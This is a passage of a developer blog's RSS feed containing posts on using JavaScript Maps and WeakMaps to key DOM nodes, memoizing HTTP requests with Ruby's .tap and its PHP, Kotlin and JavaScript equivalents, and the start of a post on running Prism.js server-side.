a detailed breakdown of how each image could benefit. If it makes sense, formatting those images could be as simple as signing up for PicPerf and prefixing the URLs of the images you&apos;d like to instantly optimize.&lt;/p&gt;&lt;h2&gt;Don&apos;t Sleep on Image Performance&lt;/h2&gt;&lt;p&gt;Especially in the chaos of day-to-day life, it&apos;s easy to sleep on this stuff and let is slip down the list of your digital marketing priorities. But there&apos;s a great deal of risk in doing so. Things may not be &quot;broken&quot; now, but you don&apos;t want to wake up one day and realize that Google and other search engines have been penalizing your site due to its poor performance experience. And because of their inherently large size and role in effective experiences, images are a great place to start.&lt;/p&gt;</content:encoded></item><item><title>Why I Like Using Maps (and WeakMaps) for Handling DOM Nodes</title><link>https://macarthur.me/posts/maps-for-dom-nodes</link><guid isPermaLink="true">https://macarthur.me/posts/maps-for-dom-nodes</guid><pubDate>Sat, 29 Apr 2023 18:06:54 GMT</pubDate><content:encoded>&lt;p&gt;We use a lot of plain, old objects to store key/value data in JavaScript, and they&apos;re great at their job – clear and legible: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const person = {
	firstName: &apos;Alex&apos;, 
	lastName: &apos;MacArthur&apos;, 
	isACommunist: false
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But when you start dealing with larger entities whose properties are frequently being read, changed, and added, it&apos;s becoming more common to see people reach for Maps instead. And for good reason: in certain situations, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map?ref=cms.macarthur.me#objects_vs._maps&quot;&gt;t&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map?ref=cms.macarthur.me#objects_vs._maps&quot;&gt;here are multiple advantages a Map has over an object&lt;/a&gt;&lt;/a&gt;, particularly those in which there are sensitive performance concerns or where the order of insertion really matters. &lt;/p&gt;&lt;p&gt;But as of late, I&apos;ve realized what I &lt;em&gt;especially&lt;/em&gt; like to use them for: &lt;strong&gt;handling large sets of DOM nodes. &lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This thought came up while reading &lt;a href=&quot;https://calebporzio.com/reactive-switchboard?ref=cms.macarthur.me&quot;&gt;a recent blog post&lt;/a&gt; from Caleb Porzio. In it, he&apos;s working with a contrived example of a table composed of 10,000 table rows, one of which can be &quot;active.&quot; To manage state as different rows are selected, an object is used as a key/value store. Here&apos;s an annotated version of one of his iterations. I also added semicolons because &lt;a href=&quot;https://macarthur.me/jk?ref=cms.macarthur.me&quot;&gt;I&apos;m not a barbarian&lt;/a&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { ref, watchEffect } from &apos;vue&apos;;

let rowStates = {};
let activeRow;

document.querySelectorAll(&apos;tr&apos;).forEach((row) =&amp;gt; {
    // Set row state.
    rowStates[row.id] = ref(false);

    row.addEventListener(&apos;click&apos;, () =&amp;gt; {
        // Update row state.
        if (activeRow) rowStates[activeRow].value = false;

        activeRow = row.id;

        rowStates[row.id].value = true;
    });

    watchEffect(() =&amp;gt; {
        // Read row state.
        if (rowStates[row.id].value) {
            row.classList.add(&apos;active&apos;);
        } else {
            row.classList.remove(&apos;active&apos;);
        }
    });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That does the job just fine (and it had &lt;em&gt;nothing&lt;/em&gt; to do with the post&apos;s point, so zero shade is being thrown here). But! It uses an object as a large hash-map-like table, so the keys used to associate values &lt;em&gt;must&lt;/em&gt; be a string, thereby requiring a unique ID (or other string value) exist on each item. That carries with it a bit of added programmatic overhead to both generate and read those values when they&apos;re needed. &lt;/p&gt;&lt;h2&gt;Any object can be a key.&lt;/h2&gt;&lt;p&gt;Instead, a Map would allow us to &lt;strong&gt;use the HTML nodes as keys themselves&lt;/strong&gt;. So, that snippet ends up looking like this: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { ref, watchEffect } from &apos;vue&apos;;

- let rowStates = {};
+ let rowStates = new Map();
let activeRow;

document.querySelectorAll(&apos;tr&apos;).forEach((row) =&amp;gt; {
-	rowStates[row.id] = ref(false);
+   rowStates.set(row, ref(false));

    row.addEventListener(&apos;click&apos;, () =&amp;gt; {
-       if (activeRow) rowStates[activeRow].value = false;
+       if (activeRow) rowStates.get(activeRow).value = false;

        activeRow = row;

-       rowStates[row.id].value = true;
+       rowStates.get(activeRow).value = true;
    });

    watchEffect(() =&amp;gt; {
-       if (rowStates[row.id].value) {
+       if (rowStates.get(row).value) {
            row.classList.add(&apos;active&apos;);
        } else {
            row.classList.remove(&apos;active&apos;);
        }
    });
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The most obvious benefit here is that &lt;strong&gt;I don&apos;t need to worry about unique IDs existing on each row. &lt;/strong&gt;The node references themselves – inherently unique – serve as the keys. Because of this, neither setting nor reading any attribute is necessary. It&apos;s simpler and more resilient. &lt;/p&gt;&lt;h2&gt;Read/write operations are &lt;em&gt;generally &lt;/em&gt;more performant.&lt;/h2&gt;&lt;p&gt;I&apos;ve italicized &quot;generally&quot; because, in most cases, the difference is negligible. But when you&apos;re working with larger data sets, the operations are notably more performant. It&apos;s even in the specification – Maps must be built in a way that preserves performance as the number of items continues to grow: &lt;/p&gt;&lt;blockquote&gt;Maps must be implemented using either hash tables or other mechanisms that, on average, provide access times that are sublinear on the number of elements in the collection.&lt;/blockquote&gt;&lt;p&gt;&quot;Sublinear&quot; just means that performance won&apos;t degrade at a proportionate rate to the size of the Map. So, even big Maps should remain fairly snappy.&lt;/p&gt;&lt;p&gt;But even on top of that, again, there&apos;s no need to mess with DOM attributes or performing a look-up by a string-like ID. Each key is &lt;em&gt;itself&lt;/em&gt; a reference, which means we can skip a step or two.&lt;/p&gt;&lt;p&gt;I did some rudimentary performance testing to confirm all of this. First, sticking with Caleb&apos;s scenario, I generated 10,000 &lt;code&gt;&amp;lt;tr&amp;gt;&lt;/code&gt; elements on a page: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const table = document.createElement(&apos;table&apos;);
document.body.append(table);

const count = 10_000;
for (let i = 0; i &amp;lt; count; i++) {
  const item = document.createElement(&apos;tr&apos;);
  item.id = i;
  item.textContent = &apos;item&apos;;
  table.append(item);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, I set up a template for measuring how long it would take to loop over &lt;em&gt;all&lt;/em&gt; of those rows and store some associated state in either an object or Map. I&apos;m also running that same process inside a &lt;code&gt;for&lt;/code&gt; loop a bunch of times, and then determining the average amount of time it took to write &amp;amp; read.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const rows = document.querySelectorAll(&apos;tr&apos;);
const times = [];
const testMap = new Map();
const testObj = {};

for (let i = 0; i &amp;lt; 1000; i++) {
  const start = performance.now();

  rows.forEach((row, index) =&amp;gt; {
    // Test Case #1  
	// testObj[row.id] = index;
	// const result = testObj[row.id];

	// Test Case #2
	// testMap.set(row, index);
	// const result = testMap.get(row);
  });

  times.push(performance.now() - start);
}

const average = times.reduce((acc, i) =&amp;gt; acc + i, 0) / times.length;

console.log(average);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I ran this test with a range different row sizes.&lt;/p&gt;&lt;table&gt;
&lt;thead&gt;
    &lt;tr&gt;
        &lt;th&gt;&lt;/th&gt;
        &lt;th&gt;100 Items&lt;/th&gt;
        &lt;th&gt;10,000 Items&lt;/th&gt;
        &lt;th&gt;100,000 Items&lt;/th&gt;
    &lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
    &lt;tr&gt;
        &lt;td&gt;Object&lt;/td&gt;
        &lt;td&gt;0.023ms&lt;/td&gt;
        &lt;td&gt;3.45ms&lt;/td&gt;
        &lt;td&gt;89.9ms&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;Map&lt;/td&gt;
        &lt;td&gt;0.019ms&lt;/td&gt;
        &lt;td&gt;2.1ms&lt;/td&gt;
        &lt;td&gt;48.7ms&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;% Faster&lt;/td&gt;
        &lt;td&gt;17%&lt;/td&gt;
        &lt;td&gt;39%&lt;/td&gt;
        &lt;td&gt;46%&lt;/td&gt;
    &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Keep in mind these results would likely vary quite a bit in even slightly different circumstances, but on the whole, they generally met my expectations. When dealing with relatively small numbers of items, performance between a Map and object was comparable. But as the number of items increased, the Map started to pull away. That sublinear change in performance started to shine.&lt;/p&gt;&lt;h2&gt;WeakMaps steward memory more effectively.&lt;/h2&gt;&lt;p&gt;There&apos;s a special version of the &lt;code&gt;Map&lt;/code&gt; interface that&apos;s designed to steward memory a bit better – a &lt;code&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap?ref=cms.macarthur.me&quot;&gt;WeakMap&lt;/a&gt;&lt;/code&gt;. It does so by holding a &quot;weak&quot; reference to its keys, so if any of those object-keys no longer have a reference bound to it elsewhere, it&apos;s eligible for garbage collection. So, when the key is no longer needed, the entire entry is automatically axed from the &lt;code&gt;WeakMap&lt;/code&gt;, clearing up even more memory. It works for DOM nodes too. &lt;/p&gt;&lt;p&gt;To tinker with this, we&apos;ll be using the &lt;code&gt;FinalizationRegistry&lt;/code&gt;, which &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/FinalizationRegistry?ref=cms.macarthur.me&quot;&gt;triggers a callback&lt;/a&gt; whenever a reference you&apos;re watching has been garbage collected (I never expected to find something like this handy, lol). We&apos;ll start with a few list items: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;ul&amp;gt;
  &amp;lt;li id=&quot;item1&quot;&amp;gt;first&amp;lt;/li&amp;gt;
  &amp;lt;li id=&quot;item2&quot;&amp;gt;second&amp;lt;/li&amp;gt;
  &amp;lt;li id=&quot;item3&quot;&amp;gt;third&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, we&apos;ll stick those items in a WeakMap, and register &lt;code&gt;item2&lt;/code&gt; to be watched by the registry. We&apos;ll remove it, and whenever it&apos;s been garbage collected, the callback will be triggered and we&apos;ll be able to see how the WeakMap has changed. &lt;/p&gt;&lt;p&gt;But... garbage collection is unpredictable and there&apos;s no official way to &lt;em&gt;make&lt;/em&gt; it happen, so to &lt;em&gt;encourage&lt;/em&gt; it, we&apos;ll periodically generate a bunch of objects and persist them in memory. Here&apos;s the entire script: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;(async () =&amp;gt; {
	const listMap = new WeakMap();

	// Stick each item in a WeakMap.
	document.querySelectorAll(&apos;li&apos;).forEach((node) =&amp;gt; {
		listMap.set(node, node.id);
	});

	const registry = new FinalizationRegistry((heldValue) =&amp;gt; {
		// Garbage collection has happened!
		console.log(&apos;After collection:&apos;, heldValue);
	});

	registry.register(document.getElementById(&apos;item2&apos;), listMap);
    
	console.log(&apos;Before collection:&apos;, listMap);

	// Remove node, freeing up reference!
	document.getElementById(&apos;item2&apos;).remove();

 	// Periodically create a bunch o&apos; objects to trigger collection.
 	const objs = [];
 	while (true) {
   		for (let i = 0; i &amp;lt; 100; i++) {
			objs.push(...new Array(100));
		}

		await new Promise((resolve) =&amp;gt; setTimeout(resolve, 10));
	}
})();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before anything happens, the WeakMap holds three items, as expected. But after the second item is removed from the DOM and garbage collection occurs, it looks a little different: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/04/maps.jpeg&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;287&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/04/maps.jpeg 600w, https://cms.macarthur.me/content/images/size/w1000/2023/04/maps.jpeg 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/04/maps.jpeg 1600w, https://cms.macarthur.me/content/images/2023/04/maps.jpeg 2087w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Since the node reference no longer exists in the DOM, the entire entry was removed from the &lt;code&gt;WeakMap&lt;/code&gt;, freeing up a smidge more memory. It&apos;s a feature I appreciate in helping to keep an environment&apos;s memory just a bit tidier.&lt;/p&gt;&lt;h2&gt;TL;DR&lt;/h2&gt;&lt;p&gt;I like using Maps for DOM nodes because: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;The nodes themselves can be used as keys. I don&apos;t need to mess with setting or reading unique attributes on each node first.&lt;/li&gt;&lt;li&gt;With large numbers of objects, they&apos;re (designed to be) more performant. &lt;/li&gt;&lt;li&gt;Using a &lt;code&gt;WeakMap&lt;/code&gt; with nodes as keys means entries will be automatically garbage collected if a node is removed from the DOM.&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Other Use Cases? &lt;/h2&gt;&lt;p&gt;I&apos;m interested in hearing of other interesting reasons to use &quot;newish&quot; objects like &lt;code&gt;Map&lt;/code&gt; and &lt;code&gt;Set&lt;/code&gt; in real-life scenarios. If you have &apos;em, share &apos;em!&lt;/p&gt;</content:encoded></item><item><title>Elegant Memoization with Ruby’s .tap Method</title><link>https://macarthur.me/posts/memoization-with-tap-in-ruby</link><guid isPermaLink="true">https://macarthur.me/posts/memoization-with-tap-in-ruby</guid><pubDate>Mon, 17 Apr 2023 22:23:25 GMT</pubDate><content:encoded>&lt;p&gt;When I was writing the Jekyll integration for &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt;, I started reminiscing about some of the features I really like about Ruby (it had been a minute since I wrote much of it). One of the first that came to mind was the conditional assignment operator, often used to memoize values:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;def results
  @results ||= calculate_results
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you&apos;re unfamiliar, the &lt;code&gt;@results&lt;/code&gt; instance variable if will only be set if it&apos;s falsey. It&apos;s a nice way to ensure an expensive operation is performed only when it&apos;s needed and never more than once.&lt;/p&gt;&lt;p&gt;For one-liners like this, it&apos;s straightforward. But sometimes, a little more complexity may require multiple lines of code, like if you were to fetch &lt;code&gt;results&lt;/code&gt; from an external service. In that case, memoization isn&apos;t as elegant. That&apos;s where another neat Ruby feature can help retain that elegance. But first, let&apos;s flesh out a scenario.&lt;/p&gt;&lt;h2&gt;Scenario: Memoizing an HTTP Request&lt;/h2&gt;&lt;p&gt;Here&apos;s a &lt;code&gt;GitHubRepo&lt;/code&gt; class for fetching repository data from the GitHub API. It handles making the request and accessing particular data we want from the response.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;require &apos;httparty&apos;

class GitHubRepo
	attr_reader :name

	def initialize(name:)
		@name = name
	end

	def license
		repo.dig(&apos;license&apos;, &apos;key&apos;)
	end

	def stars
		repo[&apos;stargazers_count&apos;]
	end
    
    private 
    
	def repo
    	puts &quot;fetching repo!&quot;
        
		response = HTTParty.get(&quot;https://api.github.com/repos/#{name}&quot;)

		JSON.parse(response.body)
	end
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Spin it up by passing in a repository name: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;repo = GitHubRepo.new(name: &apos;alexmacarthur/typeit&apos;)

puts &quot;License: #{repo.license}&quot;
puts &quot;Star Count: #{repo.stars}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Unsurprisingly, &quot;fetching repo&quot; would be output twice, since the &lt;code&gt;repo&lt;/code&gt; method is being repeatedly used with no memoization. We could solve that by more manually checking &amp;amp; setting a &lt;code&gt;@repo&lt;/code&gt; instance variable: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Inside class...
def repo
	# Check if it&apos;s already set.
	return @repo unless @repo.nil?

	puts &apos;fetching repo!&apos;

	response = HTTParty.get(&quot;https://api.github.com/repos/#{name}&quot;)

	# Set it.
	@repo = JSON.parse(response.body)
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But like I said, not as elegant. I don&apos;t &lt;em&gt;love&lt;/em&gt; needing to check if &lt;code&gt;@repo&lt;/code&gt; is &lt;code&gt;nil&lt;/code&gt; myself, and then setting it in a different branch of logic. &lt;/p&gt;&lt;h2&gt;Where &lt;code&gt;.tap&lt;/code&gt; Shines&lt;/h2&gt;&lt;p&gt;Ruby&apos;s &lt;code&gt;.tap&lt;/code&gt; method is really helpful in moments like this. It exists on the &lt;code&gt;Object&lt;/code&gt; class, and &lt;a href=&quot;https://docs.ruby-lang.org/en/2.4.0/Object.html?ref=cms.macarthur.me#method-i-tap&quot;&gt;as the docs&lt;/a&gt; describe, it &quot;yields self to the block, and then returns self.&quot; So, memoizing an HTTP response cleans up a bit better:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Inside class...
def repo
	@repo ||= {}.tap do |repo_data|
		puts &apos;fetching repo!&apos;

		response = HTTParty.get(&quot;https://api.github.com/repos/#{name}&quot;)

		repo_data.merge!(JSON.parse(response.body))
	end
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Explained: We start with an empty hash &lt;code&gt;{}&lt;/code&gt; as a &quot;default&quot; value, which is then &quot;tapped&quot; and provided to the block as &lt;code&gt;repo_data&lt;/code&gt;. Then, we can spend as many lines as we want in that self-contained block building &lt;code&gt;repo_data&lt;/code&gt; as desired before it&apos;s implicitly returned. And that block is behind a conditional assignment operator &lt;code&gt;||=&lt;/code&gt;, so future &lt;code&gt;repo&lt;/code&gt; calls will just return the &lt;code&gt;@repo&lt;/code&gt; instance variable. No variable checking. One code path. Slightly more cultivated, in my opinion. &lt;/p&gt;&lt;p&gt;But there&apos;s a potential kicker in there that&apos;s nabbed me a few times: &lt;code&gt;.tap&lt;/code&gt; will always return &lt;em&gt;itself&lt;/em&gt; from the block, no matter what you do within it. And that means if you want a particular value to be returned from the block, you have to &lt;em&gt;mutate&lt;/em&gt; that value. This would be pointless:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;repo_data = repo_data.merge(JSON.parse(response.body))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It would have simply reassigned the variable, and the original reference would have still been returned unchanged. But using the &quot;bang&quot; version of &lt;code&gt;merge&lt;/code&gt; &lt;em&gt;does&lt;/em&gt; work because it&apos;s modifying the &lt;code&gt;repo_data&lt;/code&gt; reference itself. &lt;/p&gt;&lt;h3&gt;What about a plain, old &lt;code&gt;begin&lt;/code&gt; block? &lt;/h3&gt;&lt;p&gt;Yep, something like this would definitely work, and there are some solid advantages to it, like less code and no mutations. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Inside class...
def repo
	@repo ||= begin
		puts &apos;fetching repo!&apos;

		response = HTTParty.get(&quot;https://api.github.com/repos/#{name}&quot;)

		JSON.parse(response.body)
	end
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reason I tend to prefer &lt;code&gt;.tap&lt;/code&gt; is because (I feel like) it gives me a little more control over the shape of the object &lt;em&gt;I&apos;m building&lt;/em&gt;. In cases like this, there&apos;s nothing I can do to guarantee that the response body will be modeled in a particular way. Using &lt;code&gt;.tap&lt;/code&gt; streamlines the building of my hash exactly how I want, and makes it easy to fall back to default values if certain properties aren&apos;t found. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Inside class...
def repo
	@repo ||= {}.tap do |repo_data|
		puts &apos;fetching repo!&apos;

		response = HTTParty.get(&quot;https://api.github.com/repos/#{name}&quot;)
		data = JSON.parse(response.body)

		# Shaping the hash exactly how I want it:
		repo_data[&apos;license&apos;] = data.dig(&apos;license&apos;, &apos;key&apos;) || &quot;unknown&quot;
		repo_data[&apos;stargazers_count&apos;] = data[&apos;stargazers_count&apos;]
	end
end&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not to mention, by &lt;em&gt;starting&lt;/em&gt; with that empty hash, we&apos;re guaranteeing that the request would never be performed again, even if the response resolves to something falsey. &lt;/p&gt;&lt;p&gt;That said, the distinction probably doesn&apos;t matter that much. Make your own choices.&lt;/p&gt;&lt;h2&gt;Similar Methods in Other Languages &lt;/h2&gt;&lt;p&gt;You can tell a feature is valuable when other languages or frameworks adopt their own version of it, and this is one of those. I&apos;m aware of just a couple, but I&apos;m sure there are more.&lt;/p&gt;&lt;p&gt;Laravel (PHP), for example, exposes a &lt;a href=&quot;https://laravel.com/docs/10.x/helpers?ref=cms.macarthur.me#method-tap&quot;&gt;global &lt;code&gt;tap()&lt;/code&gt; &lt;a href=&quot;https://laravel.com/docs/10.x/helpers?ref=cms.macarthur.me#method-tap&quot;&gt;helper method&lt;/a&gt;&lt;/a&gt;, and there&apos;s even a &lt;a href=&quot;https://github.com/laravel/framework/blob/10.x/src/Illuminate/Support/Traits/Tappable.php?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;Tabbable&lt;/code&gt; trait&lt;/a&gt;, which is used to add a &lt;code&gt;tap&lt;/code&gt; method to several classes within the framework. Moreover, Taylor Otwell has even said its &lt;a href=&quot;https://medium.com/@taylorotwell/tap-tap-tap-1fc6fc1f93a6?ref=cms.macarthur.me&quot;&gt;inspiration was found in Ruby&lt;/a&gt;. Here&apos;s a snippet robbed straight from their documentation: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;$user = tap(User::first(), function (User $user) {
    $user-&amp;gt;name = &apos;taylor&apos;;
 
    $user-&amp;gt;save();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And here&apos;s how that helper could be used to memoize our GitHub API request. As you can see, it works nicely with PHP&apos;s &lt;a href=&quot;https://www.php.net/manual/en/migration70.new-features.php?ref=cms.macarthur.me#migration70.new-features.null-coalesce-op&quot;&gt;null coalescing operator&lt;/a&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Inside class...
private function repo()
    {
    	// Perform request only if property is empty.
		return $this-&amp;gt;repo = $this-&amp;gt;repo ?? tap([], function(&amp;amp;$repoData) {
			echo &apos;Fetching repo!&apos;;
    
			$client = new Client();
			$response = $client-&amp;gt;request(&apos;GET&apos;, &quot;https://api.github.com/repos/{$this-&amp;gt;name}&quot;);

			$repoData += json_decode($response-&amp;gt;getBody(), true);
    	});
	}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kotlin&apos;s actually has a couple tools similar to &lt;code&gt;.tap&lt;/code&gt;. The &lt;code&gt;.apply&lt;/code&gt; and &lt;code&gt;.also&lt;/code&gt; methods permit you to mutate an object reference that&apos;s implicitly returned at the end of a lambda:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;val repo = mutableMapOf&amp;lt;Any, Any&amp;gt;().also { repoData -&amp;gt;
	print(&quot;fetching repo!&quot;)
    
	val response = get(&quot;https://api.github.com/repos/$name&quot;)
	jacksonObjectMapper().readValue&amp;lt;Map&amp;lt;String, Any&amp;gt;&amp;gt;(response.text).also { fetchedData -&amp;gt;
		repoData.putAll(fetchedData)
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But for memoization, you don&apos;t even need them. Kotlin&apos;s &lt;code&gt;lazy&lt;/code&gt; delegate will automatically memoize the result of the proceeding self-contained block.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Inside class...
private val repoData: Map&amp;lt;String, Any&amp;gt; by lazy {
	print(&quot;fetching repo!&quot;)
    
	val response = get(&quot;https://api.github.com/repos/$name&quot;)
	jacksonObjectMapper().readValue&amp;lt;Map&amp;lt;String, Any&amp;gt;&amp;gt;(response.text)
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly, God&apos;s language, JavaScript, doesn&apos;t have a built-in &lt;code&gt;.tap&lt;/code&gt; method, but it could easily be leveraged with &lt;a href=&quot;https://lodash.com/docs/?ref=cms.macarthur.me#tap&quot;&gt;Lodash&apos;s implementation&lt;/a&gt;. Or, if you&apos;re feeling particularly dangerous, tack it onto the &lt;code&gt;Object&lt;/code&gt; prototype yourself. Continuing with the repository fetch example:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Object.prototype.tap = async function(cb) {
  await cb(this);

  return this;
};

// Create an empty object for storing the repo data.
const repoData = await Object.create({}).tap(async function (o) {
  const response = await fetch(
    `https://api.github.com/repos/alexmacarthur/typeit`
  );
  const data = await response.json(response);

  // Mutate tapped object.
  Object.assign(o, data);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For memoization, this would pair decently with the new-ish &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Nullish_coalescing?ref=cms.macarthur.me&quot;&gt;nullish coalescing operator&lt;/a&gt;. Say we were in the context of a class like before: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Inside class...
async getRepo() {
	this.repo = this.repo ?? await Object.create({}).tap(async (o) =&amp;gt; {
		console.log(&quot;fetching repo!&quot;);
        
		const response = await fetch(
          `https://api.github.com/repos/alexmacarthur/typeit`
        );
        const data = await response.json(response);

        Object.assign(o, data);
      });

    return this.repo;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still not the level of elegance that Ruby offers, but it&apos;s getting there.&lt;/p&gt;&lt;h2&gt;A Gem in the Rough&lt;/h2&gt;&lt;p&gt;Like I mentioned, it&apos;s been a little while since I&apos;ve dabbled in Ruby, spending most of my time as of late in Kotlin, PHP, and JavaScript. But I think that sabbatical has given more comprehensive, renewed perspective on the language, and helped me to appreciate the experience it offers despite the things I don&apos;t prefer so much (there are some). Hoping I continue to identify these lost gems!&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you to Jason, a far-above-average golfer, who taught me Ruby tricks like this.&lt;/em&gt;&lt;/p&gt;</content:encoded></item><item><title>If Possible, Don&apos;t Run Prism.js in the Browser</title><link>https://macarthur.me/posts/run-prism-js-server-side</link><guid isPermaLink="true">https://macarthur.me/posts/run-prism-js-server-side</guid><pubDate>Sun, 19 Mar 2023 05:55:56 GMT</pubDate><content:encoded>&lt;p&gt;I just moved this site&apos;s content over to a headless Ghost instance. As a part of that move, instead of processing Markdown, I&apos;m retrieving raw HTML. I like that. It means fewer dependencies and a less complex build process.&lt;/p&gt;&lt;p&gt;But it also means I need to do a little more work in setting up syntax highlighting myself, rather than letting Remark do it for me.&lt;/p&gt;&lt;p&gt;Prism has two implementation options: process markup on a server, or do it with a client-side JavaScript package. As I was digging in, I was a little startled to find so many tutorials suggesting you just go with the latter - slap another script onto onto your site and call it good.&lt;/p&gt;&lt;p&gt;One one hand, I get it. It&apos;s certainly the quickest, simplest approach. But I&apos;m a front-end performance stickler, and I wasn&apos;t satisfied with that approach.&lt;/p&gt;&lt;h2&gt;The Downsides of Client-Side Prism.js&lt;/h2&gt;&lt;p&gt;If you&apos;re keen on site performance, there are a couple of reasons you might avoid running Prism fully in the browser.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;First, it&apos;ll impact your bundle size. &lt;/strong&gt;Prism&apos;s client-side JavaScript package isn&apos;t huge, adding about 7kb of (gzipped) page weight:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;940&quot; height=&quot;104&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/03/image-2.png 600w, https://cms.macarthur.me/content/images/2023/03/image-2.png 940w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Not too bad. But that alone won&apos;t give you support for all the languages you might need to support. You&apos;ll just get the defaults: &lt;code&gt;markup&lt;/code&gt;, &lt;code&gt;css&lt;/code&gt;, &lt;code&gt;clike&lt;/code&gt; and &lt;code&gt;javascript&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;To handle that, &lt;a href=&quot;https://prismjs.com/plugins/autoloader/?ref=cms.macarthur.me&quot;&gt;Prism offers an autoloader&lt;/a&gt; which will automatically load the necessary languages based on your code snippet markup. This is handy in accounting for the languages you eventually want to support, without loading all of them up front 100% of the time. (Don&apos;t even consider that route... it&apos;s ~2.7mb of non-gzipped JavaScript.)&lt;/p&gt;&lt;p&gt;Even so, those little bundles start to add up. If you have snippets from five different languages on a page, each of them needs to be independently lazily loaded, gradually increasing the amount of code being shipped to and executed within the browser.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;994&quot; height=&quot;614&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/03/image-1.png 600w, https://cms.macarthur.me/content/images/2023/03/image-1.png 994w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;For your typical blog post, this probably doesn&apos;t amount to anything substantive. But page weight isn&apos;t the only thing impacted.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Second, it&apos;ll cause a flash of un-formatted snippets. &lt;/strong&gt;In order for your snippets to be styled correctly, Prism needs to transform your code into a particular form of markup. For example, this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;pre&amp;gt;
  &amp;lt;code class=&quot;language-js&quot;&amp;gt;
    const greeting = &apos;Hello, world!&apos;;

    function sayGreeting() {
      console.log(greeting);
    }
  &amp;lt;/code&amp;gt;
&amp;lt;/pre&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;... is transformed into this: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;pre class=&quot;language-js&quot;&amp;gt;
  &amp;lt;code class=&quot;language-js&quot;&amp;gt;
